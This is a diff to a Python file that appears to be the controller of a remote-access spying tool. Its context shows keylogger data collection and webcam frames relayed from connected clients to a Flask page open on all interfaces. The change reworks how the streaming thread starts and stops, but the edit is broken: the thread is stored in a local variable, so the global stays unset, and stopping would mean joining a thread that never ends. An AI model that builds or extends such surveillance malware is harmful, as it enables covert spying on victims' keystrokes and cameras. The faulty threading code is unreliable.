@@ -15,6 +15,8 @@ server_thread = None
 streaming = False
 keylogger_data = []  # List to store keylogger data
 keylogger_running = False  # Flag to check if keylogger is running
+flask_thread = None  # Global variable to store the Flask thread
+
 
 html_template = """
 <!doctype html>
@@ -67,9 +69,10 @@ def start_streaming(client_socket, mode, client_id):
     print(Fore.BLUE + f"[ * ] Opening player at: http://127.0.0.1:5000")
     print(Fore.BLUE + "[ * ] Streaming...")
 
-    # Run the Flask app in a separate thread to handle the streaming
-    threading.Thread(target=lambda: app.run(host='0.0.0.0', port=5000, use_reloader=False)).start()
-
+        # Run the Flask app in a separate thread to handle the streaming
+    flask_thread = threading.Thread(target=lambda: app.run(host='0.0.0.0', port=5000, use_reloader=False))
+    flask_thread.start()
+  
 def generate_frames(client_socket, client_id):
     global streaming
     while streaming:
@@ -179,10 +182,12 @@ def handle_client(client_socket, addr):
             print(Fore.WHITE + "[ * ] Available Webcams:\n" + response)
 
 def stop_flask():
-    func = request.environ.get('werkzeug.server.shutdown')
-    if func is None:
-        raise RuntimeError('Not running with the Werkzeug Server')
-    func()
+    global flask_thread
+    if flask_thread is not None:
+        print(Fore.YELLOW + "[ * ] Stopping Flask server...")
+        flask_thread.join()  # Wait for the thread to finish
+        flask_thread = None
+
 
 def main():
     server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
